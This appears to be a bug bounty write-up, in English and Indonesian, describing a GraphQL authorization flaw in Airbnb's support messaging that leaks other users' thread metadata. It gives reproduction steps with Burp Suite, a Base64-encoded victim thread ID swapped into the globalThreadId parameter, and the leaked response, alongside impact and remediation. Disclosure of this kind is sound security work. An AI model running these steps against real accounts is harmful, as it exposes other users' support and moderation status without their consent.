GraphQL Thread Metadata Disclosure — Airbnb

📅 2026 ⏱ 5 min read 🎯 HackerOne — Airbnb 👤 Ahan Pahlevi

Overview

While exploring Airbnb's support message system, I discovered that an authenticated user can access partial metadata of another user's support thread by manipulating the globalThreadId parameter in the ViaductGetThreadAndDataQuery GraphQL endpoint. Although the report was closed as informative by Airbnb Security, the finding demonstrates a real authorization inconsistency worth documenting.

Airbnb Response: "Being able to know if a user has an active conversation does not appear to pose a security risk." — Airbnb Security Team

Vulnerability Summary

The server returns HTTP 200 with partial thread metadata belonging to other users when an unauthorized globalThreadId is supplied — instead of returning a clean HTTP 403. Message content itself is protected, but metadata leaks include:

  • Thread ID & existence confirmation
  • Inbox visibility status (hiddenInInbox) → reveals moderation status
  • Activity timestamps (mostRecentInboxActivityAtMsFromROS)
  • Profile images of support participants

Steps to Reproduce

Step 1 — Siapkan dua akun Airbnb:

Account A → Attacker
Account B → Victim

Step 2 — Login sebagai Account B, buka support chat dan catat thread ID dari URL:

https://www.airbnb.com/guest/messages/2472328079
                                              ^^^^^^^^^^
                                              Thread ID

Step 3 — Login sebagai Account A, intercept traffic dengan Burp Suite. Browse ke halaman support untuk trigger request:

GET /api/v3/ViaductGetThreadAndDataQuery

Step 4 — Encode thread ID milik victim ke Base64:

$ echo -n "MessageThread:2472328079" | base64
TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5

Step 5 — Di Burp Repeater, ganti nilai globalThreadId dengan encoded thread ID milik victim, lalu send:

GET /api/v3/ViaductGetThreadAndDataQuery/d8dbf8f7...
  ?operationName=ViaductGetThreadAndDataQuery
  &variables={"globalThreadId":"TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5"...}
Cookie: [Account A session]

Response (HTTP 200 — Data Leak)

{
  "data": {
    "threadData": {
      "id": "TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5",
      "hiddenInInbox": true,
      "inboxAccessibilityTemplateText": "You do not have access to this thread.",
      "inboxProfileImages": [...],
      "mostRecentInboxActivityAtMsFromROS": "0",
      "fetchedAt": "1773610116970"
    }
  }
}

Server mengembalikan HTTP 200 dengan metadata thread milik Account B, padahal Account A tidak memiliki akses. Inkonsistensi ini terjadi karena authorization check hanya diterapkan pada level konten pesan, bukan pada level GraphQL resolver metadata.

Impact Analysis

Meskipun konten pesan terlindungi, metadata yang bocor dapat digunakan untuk:

  • User profiling — konfirmasi apakah user memiliki support conversation aktif
  • Moderation enumeration — hiddenInInbox: true mengindikasikan akun sedang dalam review
  • Activity pattern analysis — timestamp aktivitas support terakhir bocor
  • Attack chaining — enumerasi valid thread ID untuk serangan lanjutan

Remediation

  • Return HTTP 403 untuk seluruh request ketika user tidak terotorisasi
  • Validasi thread ownership di server-side sebelum mengembalikan field apapun
  • Implementasi consistent authorization check di semua GraphQL field resolver

Lessons Learned

Tidak semua temuan diterima sebagai valid vulnerability — dan itu wajar. Yang penting adalah proses: enumerasi endpoint, analisis response behavior, dan pelaporan yang terstruktur. Metadata disclosure sering dianggap low severity, tapi dalam konteks yang tepat bisa menjadi bagian dari attack chain yang lebih besar.
